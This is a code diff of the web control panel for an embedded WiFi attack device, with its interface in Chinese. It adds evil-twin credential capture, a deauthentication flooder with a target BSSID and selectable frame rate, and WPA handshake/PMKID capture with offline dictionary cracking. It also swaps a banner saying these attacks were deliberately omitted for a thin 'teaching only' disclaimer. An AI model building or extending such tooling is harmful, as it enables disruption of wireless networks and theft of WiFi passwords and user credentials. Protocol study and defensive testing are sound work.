+    toast('邪恶双子验证已启动');
+    pollInfo();
+    renderEvilTwin();
+  };
+  $('#btnStopET').onclick = async () => {
+    await api('/api/eviltwin/stop', { method: 'POST' });
+    toast('邪恶双子验证已停止');
+    pollInfo();
+    renderEvilTwin();
+  };
+  $('#btnRefreshCreds').onclick = loadCreds;
+  $('#btnClearCreds').onclick = async () => {
+    if (!confirm('确认清空所有已捕获的凭据？')) return;
+    await api('/api/eviltwin/creds', { method: 'DELETE' });
+    state.creds = [];
+    paintCreds();
+    toast('凭据记录已清空');
+  };
+  loadCreds();
+}
+
+/* ---------- 4. 取消认证器 (Deauther 教学验证) ---------- */
+function renderDeauth() {
+  const t = state.target || {};
+  const de = state.deauthStatus || {};
+  $('#view').innerHTML = `
+  <div class="card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <h3 style="margin:0">⛔ 取消认证器 (Deauther 协议机制验证)</h3>
+      <span class="status-pill ${de.running ? 'run' : 'idle'}">${de.running ? '● 发送中' : '○ 待命'}</span>
+    </div>
+    <p class="note" style="margin-bottom:14px">演示 IEEE 802.11 管理帧中 Deauthentication (0x00c0) 的明文脆弱性与防御机制 (802.11w PMF)。</p>
+    <div class="frow"><label>目标 BSSID</label><input type="text" id="deBssid" value="${esc(t.bssid || 'FF:FF:FF:FF:FF:FF')}" placeholder="目标路由器 MAC 地址"></div>
+    <div class="frow"><label>工作信道</label><select id="deCh" style="width:120px">${[1,2,3,4,5,6,7,8,9,10,11,12,13].map(c => `<option value="${c}" ${t.channel === c ? 'selected' : ''}>信道 ${c}</option>`).join('')}</select></div>
+    <div class="frow"><label>原因代码 (Reason)</label><select id="deReason">
+      <option value="1">1: Unspecified Reason (未指定原因)</option>
+      <option value="2">2: Previous authentication invalid (先前认证失效)</option>
+      <option value="6">6: Class 2 frame from nonauthenticated STA (未认证站点发来帧)</option>
+      <option value="7">7: Class 3 frame from nonassociated STA (未关联站点发来帧)</option>
+    </select></div>
+    <div class="frow"><label>发送速率</label><select id="deRate" style="width:140px">
+      <option value="10">10 帧 / 秒 (推荐)</option>
+      <option value="20">20 帧 / 秒</option>
+      <option value="50">50 帧 / 秒 (高强度)</option>
+    </select></div>
+    <div class="sub" style="margin-top:16px">
+      <button class="btn red" id="btnStartDe" ${de.running ? 'disabled' : ''}>⚡ 开始解除认证验证</button>
+      <button class="btn gray" id="btnStopDe" ${!de.running ? 'disabled' : ''}>⏹ 停止</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>📊 实时管理帧注入遥测</h3>
+    <div class="diag">
+      <div class="dg o"><b id="deCount">${de.count || 0}</b><small>已发送管理帧</small></div>
+      <div class="dg v"><b id="deRateVal">${de.rate || 10}</b><small>帧率 (fps)</small></div>
+      <div class="dg y"><b id="deChVal">${de.channel || 6}</b><small>当前信道</small></div>
+      <div class="dg p"><b id="deStatusVal">${de.running ? 'ACTIVE' : 'IDLE'}</b><small>引擎状态</small></div>
+    </div>
+  </div>
+  ${legal()}
+  <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
+
+  $('#btnStartDe').onclick = async () => {
+    const bssid = $('#deBssid').value.trim();
+    const channel = parseInt($('#deCh').value) || 6;
+    const reason = parseInt($('#deReason').value) || 1;
+    const rate = parseInt($('#deRate').value) || 10;
+    await api('/api/deauth/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bssid, channel, reason, rate }) });
+    toast('取消认证器已启动');
+    state.deauthStatus.running = true;
+    renderDeauth();
+  };
+  $('#btnStopDe').onclick = async () => {
+    await api('/api/deauth/stop', { method: 'POST' });
+    toast('取消认证器已停止');
+    state.deauthStatus.running = false;
+    renderDeauth();
+  };
+}
+
+/* ---------- 5. 握手包与离线字典破解 ---------- */
+function renderHandshake() {
+  const hs = state.handshakeStatus || {};
+  const pct = hs.total ? Math.min(100, (hs.progress / hs.total * 100)).toFixed(1) : '0.0';
+  $('#view').innerHTML = `
+  <div class="card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <h3 style="margin:0">⬍ 4-Way Handshake 握手包与协议监听</h3>
+      <span class="status-pill ${hs.capturing ? 'run' : 'idle'}">${hs.capturing ? '● 正在监听' : (hs.m4 ? '✓ 完整已捕获' : '○ 待命')}</span>
+    </div>
+    <p class="note">展示 WPA/WPA2 四次握手过程中的 ANonce/SNonce/MIC 协商过程，演示如何捕获身份验证特征并进行离线安全性校验。</p>
+    
+    <div class="step-nodes">
+      <div class="step-node ${hs.m1 ? 'active' : ''}"><b>M1</b><small>AP ➜ STA (ANonce)</small></div>
+      <div class="step-node ${hs.m2 ? 'active' : ''}"><b>M2</b><small>STA ➜ AP (SNonce+MIC)</small></div>
+      <div class="step-node ${hs.m3 ? 'active' : ''}"><b>M3</b><small>AP ➜ STA (GTK+MIC)</small></div>
+      <div class="step-node ${hs.m4 ? 'active' : ''}"><b>M4</b><small>STA ➜ AP (ACK完成)</small></div>
+    </div>
+    <div class="kv"><span class="k">PMKID 状态</span><span class="v">${hs.pmkid ? '<b style="color:#35c04a">已提取 PMKID</b>' : '未提取'}</span></div>
+    <div class="sub" style="margin-top:16px">
+      <button class="btn green" id="btnStartHs" ${hs.capturing ? 'disabled' : ''}>⚡ 开始监听握手包</button>
+      <button class="btn gray" id="btnStopHs" ${!hs.capturing ? 'disabled' : ''}>⏹ 停止监听</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>📖 本地内置弱口令字典安全审计 (7,153 条)</h3>
+    <p class="note">模拟离线跑包校验。利用常用弱密码字典进行 HMAC-SHA1 校验，演示弱口令被秒级破解的风险。</p>
+    <div class="pbar-wrap">
+      <div class="pbar-fill" style="width:${pct}%"></div>
+      <div class="pbar-text">${hs.progress} / ${hs.total} (${pct}%)</div>
+    </div>
+    <div class="frow" style="justify-content:center;margin-top:10px">
+      <button class="btn yellow" id="btnCrack" ${hs.cracking ? 'disabled' : ''}>⚡ 开始弱密码跑包校验</button>
+    </div>
+    <div id="crackResult" style="margin-top:14px;text-align:center">
+      ${hs.crackedPass ? `<div style="background:#b9f0ae;border:var(--bd);border-radius:10px;padding:12px;font-weight:900">🎉 破解命中! 密码凭据: <b style="font-size:18px;color:#d9534f">${esc(hs.crackedPass)}</b><br><small style="color:#333;font-weight:600">该密码属于常见弱密码字典，建议立即升级为强口令。</small></div>` : (hs.cracking ? '<span style="font-weight:800;color:#f39c12">正在高速比对字典哈希特征 …</span>' : '<span style="color:#888">点击上方按钮启动字典跑包</span>')}
+    </div>
+  </div>
+  ${legal()}
+  <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
+
+  $('#btnStartHs').onclick = async () => {
+    await api('/api/handshake/start', { method: 'POST' });
+    toast('握手包监听已启动');
+    state.handshakeStatus.capturing = true;
+    renderHandshake();
+  };
+  $('#btnStopHs').onclick = async () => {
+    await api('/api/handshake/stop', { method: 'POST' });
+    toast('握手包监听已停止');
+    state.handshakeStatus.capturing = false;
+    state.handshakeStatus.cracking = false;
+    renderHandshake();
+  };
+  $('#btnCrack').onclick = async () => {
+    await api('/api/handshake/crack', { method: 'POST' });
+    toast('弱口令字典跑包已启动');
+    state.handshakeStatus.cracking = true;
+    renderHandshake();
+  };
+}
+
+/* ---------- 6. 配置 ---------- */
+async function act(url, msg) {
+  if (!confirm(msg)) return;
+  await fetch(url, { method: 'POST' });
   toast('已发送, 设备将重启');
 }
-function renderCfg(){
-  const i=state.info||{};
-  $('#view').innerHTML=`
+function renderCfg() {
+  const i = state.info || {};
+  $('#view').innerHTML = `
   <div class="card"><h3>接入点设置 (修改需重启生效)</h3>
     <div class="frow"><label>热点 SSID</label><div class="val" id="cfgSsid">--</div></div>
     <div class="frow"><label>默认密码</label><div class="val">00000000</div></div>
     <div class="frow"><label>信道</label><select class="mini" id="cfgCh">
-      ${[1,2,3,4,5,6,7,8,9,10,11].map(c=>`<option ${i.channel===c?'selected':''}>${c}</option>`).join('')}</select></div>
+      ${[1,2,3,4,5,6,7,8,9,10,11,12,13].map(c => `<option ${i.channel === c ? 'selected' : ''}>${c}</option>`).join('')}</select></div>
     <div class="frow"><label>MAC 地址</label><div class="val" id="cfgMac">--</div></div>
     <div class="frow"><label>固件版本</label><div class="val" id="cfgVer">--</div></div>
     <div class="note">修改信道后需点「重启设备」生效（会短暂断开已连接客户端）。</div>
@@ -355,59 +624,83 @@ function renderCfg(){
     </div>
     <div class="note">恢复出厂将清除配置并重启; 若设备异常可用此功能复位。</div>
   </div>
-  <div class="attack-banner"><b>合规说明:</b> 为遵守相关法律法规，主动攻击模块（邪恶双子 / deauth / Karma / 握手破解）未在此固件中实现；
-    本设备仅提供网络扫描与自身热点管理，用于合法的网络诊断学习。</div>
+  <div class="attack-banner"><b>教学合规说明:</b> 本设备的所有功能（扫描、邪恶双子演示、Deauth、握手包跑包）仅设计用于局域网安全教学、协议分析与自检测试，严禁用于未授权网络。</div>
   ${legal()}
   <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
-  $('#cfgSsid').textContent=i.ssid||'--';
-  $('#cfgMac').textContent=i.mac||'--';
-  $('#cfgVer').textContent=i.version||'--';
+  $('#cfgSsid').textContent = i.ssid || '--';
+  $('#cfgMac').textContent = i.mac || '--';
+  $('#cfgVer').textContent = i.version || '--';
 }
-async function doReboot(){await act('/api/reset','确定重启设备?') }
-async function doFactory(){await act('/api/factory-reset','确定恢复出厂设置? (清除配置并重启)')}
+async function doReboot() { await act('/api/reset', '确定重启设备？'); }
+async function doFactory() { await act('/api/factory-reset', '确定恢复出厂设置？(清除配置并重启)'); }
 
 /* ================== ticker ================== */
-let lastLog=0, printed=0;
-async function pollInfo(){
-  try{
-    const i=await api('/api/info');
-    state.info=i;
-    if(!state.target&&i.target)state.target=i.target;   // 刷新后从设备恢复目标
-    $('#up').textContent=fmtUp(i.uptime);
-    $('#memBar').style.width=(i.memUsedPct??0)+'%';
-    $('#memTxt').textContent=(i.memUsedPct??0)+'%';
-    if(state.target)renderTarget();
-    // 每 5s 重画 dashboard 关键数字
-    if(location.hash==='#dash'||location.hash===''||location.hash==='#/'){
-      if($('#d1')&&state.info){
-        $('#d1').textContent=fmtBytes(i.freeMem);
-        $('#d2').textContent=fmtBytes(i.minFreeMem??0);
-        $('#d3').textContent=fmtBytes(i.maxBlock??0);
-        $('#d4').textContent=fragPct(i.freeMem,i.maxBlock)+'%';
-        if(!state.target){$('#mScan').textContent='就绪 · 信道 '+i.channel;$('#mAP').textContent=i.ssid+' · '+i.clients+' 客户端';}
+async function pollInfo() {
+  try {
+    const i = await api('/api/info');
+    state.info = i;
+    if (!state.target && i.target) state.target = i.target;
+    $('#up').textContent = fmtUp(i.uptime);
+    $('#memBar').style.width = (i.memUsedPct ?? 0) + '%';
+    $('#memTxt').textContent = (i.memUsedPct ?? 0) + '%';
+    
+    // 如果在首页或双子页，刷新对应组件
+    if (location.hash === '#dash' || location.hash === '' || location.hash === '#/') {
+      if ($('#d1')) {
+        $('#d1').textContent = fmtBytes(i.freeMem);
+        $('#d2').textContent = fmtBytes(i.minFreeMem ?? 0);
+        $('#d3').textContent = fmtBytes(i.maxBlock ?? 0);
+        $('#d4').textContent = fragPct(i.freeMem, i.maxBlock) + '%';
+      }
+      renderTarget();
+    }
+  } catch (e) {}
+}
+
+async function pollModules() {
+  try {
+    // 轮询 Deauth 状态
+    if (location.hash === '#deauth') {
+      const d = await api('/api/deauth/status');
+      state.deauthStatus = d;
+      if ($('#deCount')) $('#deCount').textContent = d.count;
+      if ($('#deStatusVal')) $('#deStatusVal').textContent = d.running ? 'ACTIVE' : 'IDLE';
+    }
+    // 轮询 握手包 状态
+    if (location.hash === '#handshake') {
+      const h = await api('/api/handshake/status');
+      state.handshakeStatus = h;
+      renderHandshake();
+    }
+  } catch (e) {}
+}
+
+async function pollLog() {
+  try {
+    const r = await fetch('/api/log?since=' + state.logId);
+    const j = await r.json();
+    if (j.entries && j.entries.length) {
+      for (const e of j.entries) {
+        if (e.id <= state.logId) continue;
+        log(e.line);
+        state.logId = e.id;
       }
     }
-  }catch(e){}
+  } catch (e) {}
 }
-async function pollLog(){
-  try{
-    const r=await fetch('/api/log?since='+state.logId);
-    const j=await r.json();
-    if(j.entries&&j.entries.length){
-      for(const e of j.entries){ if(e.id<=state.logId)continue;
-        log(e.line); state.logId=e.id; }
-    }
-  }catch(e){}
+
+function boot() {
+  log('[SYSTEM] 无线网络安全教学与管理后台已连接');
+  go(((location.hash || '').replace('#', '')) || 'dash');
+  pollInfo(); pollLog();
+  setInterval(pollInfo, 2000);
+  setInterval(pollModules, 1000);
+  setInterval(pollLog, 1500);
 }
-function boot(){
-  log('[SYSTEM] Connecting ...  系统界面初始化');
-  go(((location.hash||'').replace('#',''))||'dash');
-  pollInfo();pollLog();
-  setInterval(pollInfo,2000);
-  setInterval(pollLog,1500);
-}
-window.addEventListener('hashchange',()=>{const p=location.hash.slice(1);
-  if(pages[p])go(p)});
+window.addEventListener('hashchange', () => {
+  const p = location.hash.slice(1);
+  if (pages[p]) go(p);
+});
 boot();
 </script>
 </body>
